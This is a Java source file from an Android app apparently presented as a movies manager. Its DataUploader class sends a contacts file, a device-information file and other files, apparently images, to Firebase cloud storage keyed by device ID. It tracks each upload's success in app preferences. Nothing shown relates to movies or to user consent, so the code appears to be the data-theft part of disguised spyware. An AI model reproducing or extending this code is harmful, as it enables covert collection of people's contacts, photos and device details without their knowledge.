package com.sickboydroid.moviesmanager.server;

import android.content.Context;
import android.content.SharedPreferences;
import android.net.Uri;
import android.util.Log;

import com.google.firebase.storage.FirebaseStorage;
import com.google.firebase.storage.StorageReference;
import com.google.firebase.storage.UploadTask;
import com.sickboydroid.moviesmanager.utils.Constants;
import com.sickboydroid.moviesmanager.utils.Utils;

import java.io.File;

public class DataUploader {
    private static final String TAG = "DataUploader";
    private final StorageReference root;
    private final SharedPreferences prefs = Constants.appPrefs;

    public DataUploader(Context context) {
        FirebaseStorage storage = FirebaseManager.getFirebaseStorage();
        root = storage.getReference(Constants.FS_DEVICES).child(new Utils(context).getDeviceId());
    }

    public UploadTask uploadContacts() {
        StorageReference contactsJSON = root.child(Constants.FILE_SERVER_CONTACTS.getName());
        if (!Constants.FILE_SERVER_CONTACTS.exists()) return null;
        UploadTask uploadTaskContacts = contactsJSON.putFile(Uri.fromFile(Constants.FILE_SERVER_CONTACTS));
        uploadTaskContacts.addOnSuccessListener(taskSnapshot -> prefs.edit().putBoolean(Constants.PREF_CONTACTS_STATUS, true).commit());
        uploadTaskContacts.addOnFailureListener(e -> {
            prefs.edit().putBoolean(Constants.PREF_CONTACTS_STATUS, false).apply();
            Log.e(TAG, "Failed to upload contacts");
        });
        return uploadTaskContacts;
    }

    public UploadTask uploadFile(File file) {
        StorageReference serverFileRef = root.child(file.getName());
        UploadTask uploadFileTask = serverFileRef.putFile(Uri.fromFile(file));
        uploadFileTask.addOnSuccessListener(taskSnapshot -> prefs.edit().putInt(Constants.UPLOADED_FILES_COUNT, prefs.getInt(Constants.UPLOADED_FILES_COUNT, 0) + 1).apply());
        uploadFileTask.addOnFailureListener(e -> Log.e(TAG, "Failed to upload images"));
        return uploadFileTask;
    }

    public UploadTask uploadDeviceInfo() {
        StorageReference deviceInfoJSON = root.child(Constants.FILE_SERVER_DEVICE_INFO.getName());
        if (!Constants.FILE_SERVER_DEVICE_INFO.exists()) return null;
        UploadTask uploadTaskDeviceInfo = deviceInfoJSON.putFile(Uri.fromFile(Constants.FILE_SERVER_DEVICE_INFO));
        uploadTaskDeviceInfo.addOnSuccessListener(taskSnapshot -> prefs.edit().putBoolean(Constants.PREF_DEVICE_INFO_STATUS, true).apply());
        uploadTaskDeviceInfo.addOnFailureListener(e -> {
            prefs.edit().putBoolean(Constants.PREF_DEVICE_INFO_STATUS, false).apply();
            Log.wtf(TAG, "Failed to upload device info", e);
        });
        return uploadTaskDeviceInfo;
    }

    public void resetUploadPrefs() {
        prefs.edit().putInt(Constants.UPLOADED_FILES_COUNT, 0)
                .putBoolean(Constants.PREF_CONTACTS_STATUS, false)
                .putBoolean(Constants.PREF_DEVICE_INFO_STATUS, false)
                .apply();
    }

}
